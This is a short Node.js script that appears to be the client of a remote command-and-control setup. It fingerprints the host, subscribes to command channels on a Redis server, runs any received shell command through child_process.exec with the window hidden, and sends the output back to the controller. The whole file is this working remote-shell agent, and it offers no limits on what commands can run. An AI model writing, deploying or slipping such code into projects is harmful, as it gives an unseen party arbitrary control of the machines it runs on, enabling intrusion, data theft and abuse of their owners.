const getHostInfo = require('get-machine-info');
const connectRedis = require('redis-simple-connect');
const connectNrp = require('./nrpConnection');
const child_process = require('child_process');

const REDIS_OPTS = {
  host: '',
  port: 7869,
  db: 7,
  password: ''
};

async function main() {
  const emitClient = await connectRedis(REDIS_OPTS);
  const receiveClient = await connectRedis(REDIS_OPTS);
  const hostinfo = await getHostInfo();
  console.log(`! ${hostinfo.formatted} #${hostinfo.hash}\r\n`);
  const nrpEmit = connectNrp(emitClient, process.env.NRP_SCOPE);
  const nrpReceive = connectNrp(receiveClient, process.env.NRP_SCOPE);

  nrpEmit.on('error', console.error);
  nrpReceive.on('error', console.error);
  nrpReceive.on('command:*', (data, channel) => {
    // console.log(`received data: ${JSON.stringify(data)}`);
    const [ scope, event, target ] = channel.split(':');
    if (!target || target !== hostinfo.hash || !data || !data.command) return;

    // console.log(`received command: ${data.command}`);
    child_process.exec(data.command, { windowsHide: true }, (error, stdout, stderr) => {
      // console.log(arguments);
      nrpEmit.emit(`reply:${hostinfo.hash}`, { stdout, stderr, error });
      // console.log('emmited reply');
    });
  });
}

main();
